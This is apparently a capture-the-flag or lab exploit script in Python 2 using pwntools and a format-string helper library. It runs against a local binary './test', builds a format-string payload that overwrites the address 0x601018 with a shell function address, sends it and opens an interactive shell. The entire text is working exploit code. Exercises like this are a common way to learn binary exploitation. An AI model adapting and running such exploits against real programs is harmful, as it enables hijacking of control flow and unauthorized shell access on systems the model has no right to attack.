from pwn import *
from fmt_attack import *

p = process('./test')
shell_addr = 0x4005D6
write = 0x601018
test = Payload(6)
test.add_write_chunk(shell_addr, write)
payload = test.get_payload()
print payload
p.send(payload)
p.interactive()
